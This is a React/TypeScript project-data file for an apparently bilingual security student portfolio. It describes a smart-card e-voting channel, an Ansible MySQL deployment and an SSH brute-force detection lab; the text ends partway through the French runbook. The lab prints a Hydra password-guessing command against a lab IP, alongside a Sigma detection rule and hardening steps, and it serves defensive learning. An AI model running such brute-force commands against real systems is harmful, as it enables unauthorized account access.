import React from "react";
import hydra from "../assets/hydra-log-bruteforce.png";
import diffie from "../assets/diffie-hellman.png";
import sshlogs from "../assets/ssh-connexion-bruteforce.png";

export type Project = {
  title: { en: string; fr: string };
  category: { en: string; fr: string };
  shortDescription: { en: string; fr: string };
  longDescription: { en: string; fr: string };
  techs: string[];
  slug: string;
  github?: string;
  content?: { en: React.ReactNode; fr: React.ReactNode };
};

export const projectList: Project[] = [
 {
  title: {
    en: "Secure Client-Server Communication with Smart Cards",
    fr: "Sécurisation d'un canal Client-Serveur avec cartes à puce"
  },
  category: {
    en: "Cybersecurity / Cryptography",
    fr: "Cybersécurité / Cryptographie"
  },
  shortDescription: {
    en: "Development of a secure client-server communication channel, integrating RSA, AES, SHA-256, Diffie-Hellman key exchange, and digital signatures.",
    fr: "Développement d'un canal de communication client-serveur sécurisé basé sur des cartes à puce, intégrant RSA, AES, SHA-256, échange de clés Diffie-Hellman et signatures numériques."
  },
  longDescription: {
    en: "Development of a secure client-server communication channel using smart cards, integrating RSA, AES, SHA-256, Diffie-Hellman key exchange, and digital signatures to ensure confidentiality, authenticity, and integrity of data. Application implemented as a secure e-voting system.",
    fr: "Développement d'un canal de communication client-serveur sécurisé basé sur des cartes à puce, intégrant RSA, AES, SHA-256, échange de clés Diffie-Hellman et signatures numériques pour garantir la confidentialité, l'authenticité et l'intégrité des données. Application implémentée sous forme de système de vote électronique sécurisé."
  },
  techs: [
    "Java Card",
    "Java",
    "RSA",
    "AES-CBC",
    "SHA-256",
    "Diffie-Hellman",
    "Sockets TCP",
    "Cryptography",
    "Digital Signatures",
    "Client-Server Architecture"
  ],
  slug: "secure-smartcard-communication",
  github: "https://github.com/anxxooo/PRJP-Cartes_a_puce",
  content: {
   en: (
  <div>
    {/* Objectives */}
    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">Objectives</h2>
      <ul className="list-disc list-inside">
        <li>Ensure the confidentiality and integrity of exchanged data.</li>
        <li>Authenticate the card and server using digital signatures.</li>
        <li>Establish a secure session key via Diffie-Hellman.</li>
      </ul>
    </section>

    {/* Cards and Tools */}
    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">Cards and Tools Used</h2>
      <p>
        We used Java Card ACOSJ cards, capable of storing RSA keys and performing cryptographic operations.
      </p>
      <p>
        On the server side, we implemented a secure TCP/IP channel and a PKI key manager to authenticate each card.
      </p>
    </section>

    {/* Channel Security */}
    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">Channel Security</h2>
      <p>
        The security protocol combines several steps:
      </p>
      <ul className="list-disc list-inside">
        <li>RSA key generation for the card and the server.</li>
        <li>Secure Diffie-Hellman exchange to create a session key K.</li>
        <li>Digital signature to authenticate each side and verify message integrity.</li>
        <li>AES encryption of sensitive data during communication.</li>
      </ul>
      <div className="flex flex-col items-center gap-4 my-8">
        <img
          src={diffie}
          alt="Channel security diagram"
          className="w-64 h-70 md:w-100 md:h-120 rounded-lg shadow-lg"
        />
        <p className="text-xl md:text-2xl font-bold text-white text-center">
          Diffie-Hellman Exchange + Digital Signature for establishing a secure channel
        </p>
      </div>
    </section>

    {/* Practical Application */}
    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">Practical Application</h2>
      <p>
        To illustrate the use of the secure channel, we developed an e-voting prototype:
      </p>
      <ul className="list-disc list-inside">
        <li>The card stores the voter's identity and RSA key.</li>
        <li>Each vote is signed and encrypted before being sent to the server.</li>
        <li>The server verifies the signature and decrypts the vote to ensure integrity and anonymity.</li>
      </ul>
    </section>
  </div>
),
    fr: (
    <div>
      {/* Objectifs */}
      <section className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">Objectifs</h2>
        <ul className="list-disc list-inside">
          <li>Assurer la confidentialité et l'intégrité des données échangées.</li>
          <li>Authentifier la carte et le serveur grâce à des signatures numériques.</li>
          <li>Mettre en place une clé de session sécurisée via Diffie-Hellman.</li>
        </ul>
      </section>

      {/* Cartes et outils */}
      <section className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">Cartes et outils utilisés</h2>
        <p>
          Nous avons utilisé des cartes Java Card ACOSJ, capables de stocker des clés RSA et d'exécuter des opérations cryptographiques.
        </p>
        <p>
          Côté serveur, nous avons implémenté un canal TCP/IP sécurisé et un gestionnaire de clés PKI pour authentifier chaque carte.
        </p>
      </section>

      {/* Sécurisation du canal */}
      <section  className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">Sécurisation du canal</h2>
        <p>
          Le protocole de sécurisation combine plusieurs étapes :
        </p>
        <ul className="list-disc list-inside">
          <li>Génération de clés RSA pour la carte et le serveur.</li>
          <li>Échange sécurisé via Diffie-Hellman pour créer une clé de session K.</li>
          <li>Signature numérique pour authentifier chaque côté et vérifier l'intégrité des messages.</li>
          <li>Chiffrement AES des données sensibles pendant la communication.</li>
        </ul>
        <div className="flex flex-col items-center gap-4 my-8">
        <img
          src={diffie}
          alt="Schéma sécurisation canal"
          className="w-64 h-70 md:w-100 md:h-120  rounded-lg shadow-lg"
        />
        <p className="text-xl md:text-2xl font-bold text-white text-center">
        Echange Diffie-Hellman + Signature numérique pour la création d'un canal sécurisé
        </p>

        </div>
      </section>

      {/* Application pratique */}
      <section className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">Application pratique</h2>
        <p>
          Pour illustrer l'usage du canal sécurisé, nous avons développé un prototype d'e-vote :
        </p>
        <ul className="list-disc list-inside">
          <li>La carte stocke l'identité du votant et sa clé RSA.</li>
          <li>Chaque vote est signé et chiffré avant d'être envoyé au serveur.</li>
          <li>Le serveur vérifie la signature et déchiffre le vote pour garantir intégrité et anonymat.</li>
        </ul>
      </section>
    </div>
  )
  }
 },
{
  title: {
    en: "Automated MySQL Deployment with Ansible and Docker",
    fr: "Déploiement automatisé MySQL avec Ansible et Docker",
  },
  category: {
    en: "DevOps / Automation",
    fr: "DevOps / Automatisation",
  },
  shortDescription: {
    en: "Learning project to deploy a MySQL container on a remote VM using Ansible and Docker.",
    fr: "Projet d'apprentissage pour déployer un conteneur MySQL sur une VM distante avec Ansible et Docker.",
  },
  longDescription: {
    en: `This project was first and foremost an opportunity to learn Ansible by automating a real deployment. 
I set out to deploy a MySQL 8 service inside a Docker container on a remote VM, fully automated from my control node. 
The project taught me the core principles of infrastructure automation, container management, and idempotent deployments. 
It also gave me hands-on experience in configuring SSH, writing playbooks, and verifying services across machines.`,
    fr: `Ce projet était avant tout une occasion d'apprendre Ansible en automatisant un déploiement réel. 
J'ai déployé un service MySQL 8 dans un conteneur Docker sur une machine distante, entièrement automatisé depuis ma machine de contrôle. 
Le projet m'a permis de comprendre les principes fondamentaux de l'automatisation d'infrastructure, la gestion de conteneurs et la réalisation de déploiements idempotents. 
J'ai également acquis une expérience pratique dans la configuration SSH, la rédaction de playbooks et la vérification des services entre machines.`,
  },
  techs: ["Ansible", "Docker", "MySQL", "Linux", "SSH"],
  slug: "mysql-ansible-docker",
  github: "https://github.com/anxxooo/Deploiement-automatise-Ansible-et-Docker",
  content: {
    en: (
      <>
        <section className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">Objectifs</h2>
        <p>
          For this project, I aimed to deploy a MySQL service on a remote machine using Docker, while fully leveraging Ansible for automation. 
          This was primarily a learning exercise to understand how infrastructure as code can simplify repetitive tasks and ensure reliability.
        </p>
        </section>
        <section className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">Setup</h2>
        <p>
          I prepared a control node with Ansible installed and a managed node running Docker. 
          Secure, passwordless SSH connections were configured between the nodes, allowing Ansible to execute tasks automatically.
        </p>
        </section>

        <section className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">Inventory and Playbook</h2>
        <p>
          I created an Ansible inventory listing the managed node and connection details. 
          The playbook was designed to install Docker if needed, pull the MySQL image, and run it as a container with proper configuration. 
          Everything was idempotent, so running the playbook multiple times caused no conflicts or redundant changes.
        </p>
        </section>

        <section className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">Execution and Verification</h2>
        <p>
          Running the playbook automatically deployed the MySQL container. I verified its status and tested connectivity from the control node and other network machines.
        </p>
        </section>

        <section className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">SSH connection</h2>
        <img 
          src="https://github.com/user-attachments/assets/78aba3d1-f7ed-4fa6-ade3-5b72ad023650" 
          alt="SSH Connection Functional" 
          style={{ maxWidth: "100%" }}
        />
        </section>

        <section className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">Playbook Execution</h2>
        <img 
          src="https://github.com/user-attachments/assets/d2627cfa-0711-4439-81a4-ffea2343a3c9" 
          alt="Playbook Execution" 
          style={{ maxWidth: "100%" }}
        />
        </section>

        <section className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">Container Status</h2>
        <img 
          src="https://github.com/user-attachments/assets/a42d6bc7-dc5d-447a-82bd-3908046b8791" 
          alt="MySQL Container Running" 
          style={{ maxWidth: "100%" }}
        />
        </section>

        <section className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">Service Connectivity</h2>
        <img 
          src="https://github.com/user-attachments/assets/27f90710-d82b-422a-9182-ae3e9b787aa2" 
          alt="MySQL Service Connectivity" 
          style={{ maxWidth: "100%" }}
        />
        </section>

        <section className="mb-6">
        <h2 className="text-2xl font-semibold mb-2">Learning Outcomes</h2>
        <p>
          This project reinforced my understanding of Ansible and Docker in real-world scenarios. 
          I gained practical experience in automating service deployment, managing containers, and ensuring that deployments are reliable, repeatable, and maintainable.
        </p>
        </section>
      </>
    ),
    fr: (
  <>
    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">Objectifs</h2>
      <p>
        Pour ce projet, j'ai déployé un service MySQL sur une machine distante en utilisant Docker, tout en exploitant pleinement Ansible pour l'automatisation. 
        Il s'agissait avant tout d'un projet d'apprentissage pour comprendre comment l'infrastructure en tant que code peut simplifier les tâches répétitives et garantir la fiabilité.
      </p>
    </section>

    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">Configuration</h2>
      <p>
        J'ai préparé une machine de contrôle avec Ansible installé et une machine cible avec Docker. 
        Les connexions SSH sécurisées et sans mot de passe ont été configurées entre les machines, permettant à Ansible d'exécuter les tâches automatiquement.
      </p>
    </section>

    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">Inventaire et Playbook</h2>
      <p>
        J'ai créé un inventaire Ansible listant la machine cible et ses paramètres de connexion. 
        Le playbook a été conçu pour installer Docker si nécessaire, récupérer l'image MySQL et lancer le conteneur avec la configuration appropriée. 
        Tout a été conçu pour être idempotent, ce qui permet de relancer le playbook plusieurs fois sans provoquer de conflits ni de modifications redondantes.
      </p>
    </section>

    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">Exécution et Vérification</h2>
      <p>
        L'exécution du playbook a permis de déployer automatiquement le conteneur MySQL. 
        J'ai vérifié son état et testé la connectivité depuis la machine de contrôle ainsi que depuis d'autres machines du réseau.
      </p>
    </section>

    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">Connexion SSH</h2>
      <img 
        src="https://github.com/user-attachments/assets/78aba3d1-f7ed-4fa6-ade3-5b72ad023650" 
        alt="Connexion SSH fonctionnelle" 
        style={{ maxWidth: "100%" }}
      />
    </section>

    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">Exécution du Playbook</h2>
      <img 
        src="https://github.com/user-attachments/assets/d2627cfa-0711-4439-81a4-ffea2343a3c9" 
        alt="Exécution du playbook" 
        style={{ maxWidth: "100%" }}
      />
    </section>

    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">État du Conteneur</h2>
      <img 
        src="https://github.com/user-attachments/assets/a42d6bc7-dc5d-447a-82bd-3908046b8791" 
        alt="Conteneur MySQL actif" 
        style={{ maxWidth: "100%" }}
      />
    </section>

    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">Connexion au Service</h2>
      <img 
        src="https://github.com/user-attachments/assets/27f90710-d82b-422a-9182-ae3e9b787aa2" 
        alt="Connexion au service MySQL" 
        style={{ maxWidth: "100%" }}
      />
    </section>

    <section className="mb-6">
      <h2 className="text-2xl font-semibold mb-2">Compétences acquises</h2>
      <p>
        Ce projet m'a permis de renforcer ma compréhension d'Ansible et de Docker dans des scénarios concrets. 
        J'ai acquis une expérience pratique dans l'automatisation du déploiement de services, la gestion de conteneurs, et la garantie que les déploiements sont fiables, reproductibles et facilement maintenables.
      </p>
    </section>
  </>
),
  },
},
 {
  title: {
    en: "SSH Brute Force Detection - Blue Team Lab",
    fr: "Détection d'attaque Brute Force SSH - Lab Blue Team",
  },
  category: {
    en: "Cybersecurity / SOC",
    fr: "Cybersécurité / SOC",
  },
  shortDescription: {
    en: "Educational project simulating an SSH brute force attack, analyzing system logs, creating detection rules with Sigma, and documenting a complete SOC runbook.",
    fr: "Projet pédagogique simulant une attaque brute force SSH, analysant les logs système, créant des règles de détection avec Sigma et documentant un runbook SOC complet.",
  },
  longDescription: {
    en: `This Blue Team exercise demonstrates the full incident response lifecycle for detecting and mitigating SSH brute force attacks. 
Using Hydra to simulate realistic attack patterns on a controlled lab environment, I analyzed authentication logs to identify suspicious behavioral patterns. 
I then developed a Sigma detection rule aligned with MITRE ATT&CK framework (T1110) and documented a comprehensive SOC runbook covering the entire incident lifecycle from detection to remediation. 
This project reinforced my understanding of threat detection, log analysis, SIEM rule creation, and defensive security operations.`,
    fr: `Cet exercice Blue Team démontre le cycle complet de réponse à incident pour détecter et atténuer les attaques brute force SSH. 
En utilisant Hydra pour simuler des schémas d'attaque réalistes dans un environnement de lab contrôlé, j'ai analysé les logs d'authentification pour identifier des comportements suspects. 
J'ai ensuite développé une règle de détection Sigma alignée avec le framework MITRE ATT&CK (T1110) et documenté un runbook SOC complet couvrant l'ensemble du cycle d'incident, de la détection à la remédiation. 
Ce projet a renforcé ma compréhension de la détection de menaces, l'analyse de logs, la création de règles SIEM et les opérations de sécurité défensive.`,
  },
  techs: ["Linux", "SSH", "Hydra", "Sigma", "MITRE ATT&CK", "Log Analysis", "SOC"],
  slug: "ssh-bruteforce-detection",
  content: {
en: (
      <>
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Project Context</h2>
          <p className="mb-3">
            This project was conducted in a controlled lab environment for educational purposes with proper authorization. 
            The goal was to understand the complete Blue Team workflow when responding to SSH brute force attacks.
          </p>
          <div className="border-l-4 border-green-400 p-4 rounded shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] bg-[#111218]">
            <p className="text-sm font-semibold">Ethics Statement</p>
            <p className="text-sm text-gray-300">This attack simulation was performed exclusively on a personal lab environment, with authorization, for educational purposes only.</p>
          </div>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 1: Attack Simulation</h2>
          
          <h3 className="text-xl font-semibold mb-2 mt-4">Normal SSH Connection Baseline</h3>
          <p className="mb-3">First, I established a baseline by examining logs after a normal SSH authentication:</p>
          <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm mb-4">
            <code>sudo tail -n 20 /var/log/auth.log</code>
          </div>
          <div className="bg-gray-100 rounded mb-4">
            <img src={sshlogs} alt="Normal SSH logs" className="w-full h-auto" />
          </div>

          <h3 className="text-xl font-semibold mb-2 mt-6">Brute Force Simulation with Hydra</h3>
          <p className="mb-3">
            <strong>Hydra (THC-Hydra)</strong> is a security auditing tool used to test if a service is vulnerable to brute force or password spraying attacks. 
            It rapidly attempts multiple username/password combinations. I use it here as an attack simulation tool to verify that proper logs are generated and detection mechanisms work correctly.
          </p>

          <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm mb-4">
            <code>hydra -l testuser -P pswds.txt ssh://192.168.62.129</code>
          </div>
          <p className="mb-3">
            In this case, the attack found no valid password. Here is an excerpt of the logs generated during the brute force attack simulated with Hydra:
          </p>
          <div className="bg-gray-100 rounded mb-4">
            <img src={hydra} alt="Hydra attack logs" className="w-full h-auto" />
          </div>

          <h3 className="text-xl font-semibold mb-2 mt-6">Attack Behavior Analysis</h3>
          <div className="grid md:grid-cols-2 gap-4 mb-4">
            <div className="bg-[#111218] shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] p-4 rounded">
              <h4 className="font-semibold mb-2">What Hydra Does</h4>
              <ul className="list-disc list-inside text-sm space-y-1">
                <li>Sends numerous SSH attempts</li>
                <li>Very rapidly</li>
                <li>From the same IP address</li>
                <li>Targeting the same user account</li>
              </ul>
            </div>
            <div className="bg-[#111218] shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] p-4 rounded">
              <h4 className="font-semibold mb-2">What the Server Sees</h4>
              <ul className="list-disc list-inside text-sm space-y-1">
                <li>A sequence of: Failed password</li>
                <li>Failed password</li>
                <li>Failed password...</li>
                <li>The server doesn't know it's Hydra</li>
                <li>It just logs the failures</li>
              </ul>
            </div>
          </div>

          <h3 className="text-xl font-semibold mb-2 mt-6">SOC Analyst Perspective</h3>
          <p className="mb-3">
            "A human doesn't fail 20 passwords in 10 seconds." Therefore: temporal threshold + same IP + same user + many failures = Brute Force attack
          </p>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 2: Detection Rule Creation</h2>
          
          <h3 className="text-xl font-semibold mb-2">Understanding SSH Brute Force</h3>
          <p className="mb-3">An SSH brute force attack is not defined by a suspicious IP address, a specific country, or a particular tool, but an abnormal behavior pattern:</p>
          <ul className="list-disc list-inside space-y-1 mb-4">
            <li>Multiple "Failed password" events</li>
            <li>Same target user</li>
            <li>Same source IP</li>
            <li>Within a short time period</li>
          </ul>

          <h3 className="text-xl font-semibold mb-2 mt-6">Detection Logic</h3>
          <p className="mb-4">The detection condition is set as an alert if the same user experiences 5 SSH failures from the same source IP in less than one minute.</p>

          <h3 className="text-xl font-semibold mb-2 mt-6">Sigma Rule Implementation</h3>
          <p className="mb-3">
            <strong>Sigma</strong> is a universal language for detection rules, adaptable by all SIEMs regardless of their native language. 
            The SIEM interprets this rule and triggers an alert when conditions are met.
          </p>
          <p className="mb-3">
            <strong>MITRE ATT&CK</strong> provides a unified naming convention for attack techniques (here: T1110 - Brute Force).
          </p>

          <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm overflow-x-auto">
            <pre>{`title: SSH Brute Force Attempt
logsource:
  product: linux
  service: ssh
detection:
  selection:
    message|contains: "Failed password"
  condition: selection | count() by src_ip, user >= 5
level: high
tags:
  - attack.T1110  # T1110 - Brute Force (MITRE ATT&CK)`}</pre>
          </div>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 3: SOC Runbook</h2>

          <div className="space-y-6">
              <h3 className="text-xl font-semibold mb-2">1. Identification</h3>
              <p className="mb-2"><strong>Alert:</strong> SSH Brute Force Attempt (MITRE T1110)</p>
              <p className="mb-2"><strong>Potential Sources:</strong></p>
              <ul className="list-disc list-inside mb-3 ml-4">
                <li>SIEM</li>
                <li>Firewall logs</li>
                <li>Honeypot</li>
                <li>IDS (Intrusion Detection System)</li>
              </ul>
              <p className="font-semibold mb-2">Information to Collect:</p>
              <div className="bg-[#111218] shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] p-3 rounded">
                <ul className="space-y-1 text-sm">
                  <li><code>src_ip</code>: source of attempts</li>
                  <li><code>user</code>: targeted account</li>
                  <li><code>timestamp</code>: time window</li>
                  <li><code>hostname</code>: attacked machine</li>
                  <li><code>number_of_failures</code>: failure count</li>
                  <li><code>success</code>: was there a successful login?</li>
                </ul>
              </div>

              <h3 className="text-xl font-semibold mb-2">2. Verification</h3>
              <p className="font-semibold mb-2">Questions to Ask:</p>
              <ul className="list-disc list-inside mb-3 ml-4 space-y-1">
                <li>Is this a real attack?</li>
                <li>Is the IP external and suspicious?</li>
                <li>Multiple failures in a few seconds?</li>
                <li>Was there a successful login? (If yes: critical incident)</li>
                <li>Is the targeted account legitimate? Admin? Service account?</li>
              </ul>
              <p className="font-semibold mb-2">Useful Commands (Linux victim):</p>
              <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-sm space-y-1">
                <div><code>sudo tail -n 50 /var/log/auth.log</code></div>
                <div><code>sudo grep "Failed password" /var/log/auth.log | tail -n 20</code></div>
                <div><code>sudo grep "Accepted password" /var/log/auth.log | tail -n 20</code></div>
              </div>

              <h3 className="text-xl font-semibold mb-2">3. Context</h3>
              <p className="font-semibold mb-2">Elements to Add:</p>
              <ul className="list-disc list-inside mb-3 ml-4 space-y-1">
                <li>Is the IP known/recognized?</li>
                <li>Is it a public IP?</li>
                <li>Is it an internal IP (VPN)?</li>
                <li>Is the account protected by MFA?</li>
              </ul>
              <p className="font-semibold mb-2">IP Research:</p>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Use an IP reputation service</li>
                <li>Consult Threat Intelligence feeds</li>
              </ul>

              <h3 className="text-xl font-semibold mb-2">4. Containment</h3>
              <p className="font-semibold mb-2">Possible Scenarios:</p>
              
              <div className="mb-3">
                <p className="font-semibold text-sm mb-1">If attack from external IP:</p>
                <p className="text-sm mb-1">Block the IP at firewall/iptables level</p>
                <div className="bg-gray-900 text-green-400 p-2 rounded font-mono text-xs">
                  <code>sudo iptables -A INPUT -s &lt;IP&gt; -j DROP</code>
                </div>


              <div className="mb-3">
                <p className="font-semibold text-sm mb-1">If attack targets specific account:</p>
                <p className="text-sm mb-1">Lock the account (temporarily)</p>
                <div className="bg-gray-900 text-green-400 p-2 rounded font-mono text-xs">
                  <code>sudo usermod -L testuser</code>
                </div>
              </div>

              <div>
                <p className="font-semibold text-sm mb-1">If multiple IPs attacking:</p>
                <ul className="list-disc list-inside text-sm ml-4">
                  <li>Enable Fail2Ban</li>
                  <li>Harden SSH configuration</li>
                </ul>
              </div>
            </div>

              <h3 className="text-xl font-semibold mb-2">5. Eradication (Threat Removal)</h3>
              <p className="font-semibold mb-2">Recommended Actions:</p>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Verify if an intrusion occurred</li>
                <li>Ensure the attacker didn't create a backdoor</li>
                <li>Examine <code className="bg-gray-700 px-2 py-1 rounded text-sm">/etc/ssh/sshd_config</code></li>
              </ul>

              <h3 className="text-xl font-semibold mb-2">6. Remediation</h3>
              <p className="font-semibold mb-2">Measures to Apply:</p>
              
              <div className="mb-3">
                <p className="font-semibold text-sm mb-1">Disable password authentication, switch to SSH keys:</p>
                <div className="bg-gray-900 text-green-400 p-2 my-2 rounded font-mono text-xs space-y-1">
                  <div><code>sudo nano /etc/ssh/sshd_config</code></div>
                  <div><code># PasswordAuthentication no</code></div>
                  <div><code>sudo systemctl restart ssh</code></div>
                </div>


              <div>
                <p className="font-semibold text-sm mb-1">Limit SSH access:</p>
                <ul className="list-disc list-inside text-sm ml-4">
                  <li>Allow only specific IPs</li>
                  <li>Implement VPN requirement</li>
                </ul>
              </div>
            </div>

              <h3 className="text-xl font-semibold mb-2">7. Reporting</h3>
              <p className="font-semibold mb-2">Report to Produce:</p>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Attack date/time</li>
                <li>Source IP</li>
                <li>Targeted account</li>
                <li>Number of failures</li>
                <li>Containment actions applied</li>
                <li>Remediation measures</li>
              </ul>
              <div className="border-l-4 border-green-400 p-3 rounded shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] bg-[#111218] mt-3">
                <p className="text-sm font-semibold mb-1">Conclusion:</p>
                <p className="text-sm">
                  The attack was detected by the SSH brute force rule. Attempts were blocked and the SSH service was hardened. 
                  No successful access was observed.
                </p>
              </div>
            </div>

        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Learning Outcomes</h2>
          <p className="mb-3">
            This project provided hands-on experience with the complete Blue Team incident response workflow. 
            I learned to identify attack patterns through log analysis, create effective detection rules using industry-standard frameworks (Sigma, MITRE ATT&CK), 
            and document comprehensive response procedures.
          </p>
          <p>
            The exercise reinforced the importance of behavioral analysis over simple indicators, and demonstrated how proper detection, 
            containment, and remediation procedures can effectively mitigate security threats.
          </p>
        </section>
      </>
    ),
    fr: (
      <>
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Contexte du Projet</h2>
          <p className="mb-3">
            Ce projet a été réalisé dans un environnement de laboratoire contrôlé à des fins pédagogiques avec les autorisations appropriées. 
            L'objectif était de comprendre le workflow complet d'une équipe Blue Team lors de la réponse à des attaques brute force SSH.
          </p>
          <div className="border-l-4 border-green-400 p-4 rounded shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] bg-[#111218]">
            <p className="text-sm font-semibold">Déclaration Éthique</p>
            <p className="text-sm text-gray-300">Cette simulation d'attaque a été réalisée exclusivement sur un environnement de lab personnel, avec autorisation, à des fins pédagogiques uniquement.</p>
          </div>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 1 : Simulation d'Attaque</h2>
          
          <h3 className="text-xl font-semibold mb-2 mt-4">Référence de Connexion SSH Normale</h3>
          <p className="mb-3">D'abord, j'ai établi une référence en examinant les logs après une authentification SSH normale :</p>
          <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm mb-4">
            <code>sudo tail -n 20 /var/log/auth.log</code>
          </div>
          <div className="bg-gray-100 rounded mb-4">
            <img src={sshlogs} alt="Logs SSH normaux" className="w-full h-auto" />
          </div>

          <h3 className="text-xl font-semibold mb-2 mt-6">Simulation Brute Force avec Hydra</h3>
          <p className="mb-3">
            <strong>Hydra (THC-Hydra)</strong> est un outil d'audit de sécurité utilisé pour tester si un service est vulnérable aux attaques par force brute ou password spraying. 
            Il essaie rapidement de multiples combinaisons utilisateur/mot de passe. Je l'utilise ici comme outil de simulation d'attaque pour vérifier que les logs appropriés sont générés et que les mécanismes de détection fonctionnent correctement.
          </p>

          <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm mb-4">
            <code>hydra -l testuser -P pswds.txt ssh://192.168.62.129</code>
          </div>
          <p className="mb-3">
            L'attaque dans ce cas n'a trouvé aucun mot de passe valide. Voici un extrait des logs générés pendant l'attaque brute force simulée avec Hydra :
          </p>
          <div className="bg-gray-100 rounded mb-4">
            <img src={hydra} alt="Logs d'attaque Hydra" className="w-full h-auto" />
          </div>

          <h3 className="text-xl font-semibold mb-2 mt-6">Analyse du Comportement d'Attaque</h3>
          <div className="grid md:grid-cols-2 gap-4 mb-4">
            <div className="bg-[#111218] shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] p-4 rounded">
              <h4 className="font-semibold mb-2">Ce que fait Hydra</h4>
              <ul className="list-disc list-inside text-sm space-y-1">
                <li>Envoie de nombreuses tentatives SSH</li>
                <li>Très rapidement</li>
                <li>Depuis la même adresse IP</li>
                <li>Ciblant le même compte utilisateur</li>
              </ul>
            </div>
            <div className="bg-[#111218] shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] p-4 rounded">
              <h4 className="font-semibold mb-2">Ce que voit le Serveur</h4>
              <ul className="list-disc list-inside text-sm space-y-1">
                <li>Une séquence de : Failed password</li>
                <li>Failed password</li>
                <li>Failed password...</li>
                <li>Le serveur ne sait pas que c'est Hydra</li>
                <li>Il enregistre juste les échecs</li>
              </ul>
            </div>
          </div>

          <h3 className="text-xl font-semibold mb-2 mt-6">Perspective de l'Analyste SOC</h3>
          <p className="mb-3">
            "Un humain ne rate pas 20 mots de passe en 10 secondes." Par conséquent : seuil temporel + même IP + même utilisateur + nombreux échecs = Attaque Brute Force
          </p>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 2 : Création de Règle de Détection</h2>
          
          <h3 className="text-xl font-semibold mb-2">Comprendre le Brute Force SSH</h3>
          <p className="mb-3">Une attaque brute force SSH n'est pas définie par une adresse IP suspecte, un pays spécifique ou un outil particulier, mais un modèle de comportement anormal :</p>
          <ul className="list-disc list-inside space-y-1 mb-4">
            <li>Plusieurs événements "Failed password"</li>
            <li>Même utilisateur cible</li>
            <li>Même IP source</li>
            <li>Dans une courte période de temps</li>
          </ul>

          <h3 className="text-xl font-semibold mb-2 mt-6">Logique de Détection</h3>
          <p className="mb-4">On pose comme condition de détection une alerte si le même utilisateur subit 5 échecs SSH depuis la même IP source en moins d'une minute.</p>

          <h3 className="text-xl font-semibold mb-2 mt-6">Implémentation de la Règle Sigma</h3>
          <p className="mb-3">
            <strong>Sigma</strong> est un langage universel pour les règles de détection, adaptable par tous les SIEM quel que soit leur langage natif. 
            Le SIEM interprète cette règle et déclenche une alerte lorsque les conditions sont remplies.
          </p>
          <p className="mb-3">
            <strong>MITRE ATT&CK</strong> fournit une convention de nommage unifiée pour les techniques d'attaque (ici : T1110 - Brute Force).
          </p>

          <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm overflow-x-auto">
            <pre>{`title: SSH Brute Force Attempt
logsource:
  product: linux
  service: ssh
detection:
  selection:
    message|contains: "Failed password"
  condition: selection | count() by src_ip, user >= 5
level: high
tags:
  - attack.T1110  # T1110 - Brute Force (MITRE ATT&CK)`}</pre>
          </div>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 3 : Runbook SOC</h2>

          <div className="space-y-6">
              <h3 className="text-xl font-semibold mb-2">1. Identification</h3>
              <p className="mb-2"><strong>Alerte :</strong> SSH Brute Force Attempt (MITRE T1110)</p>
              <p className="mb-2"><strong>Sources Possibles :</strong></p>
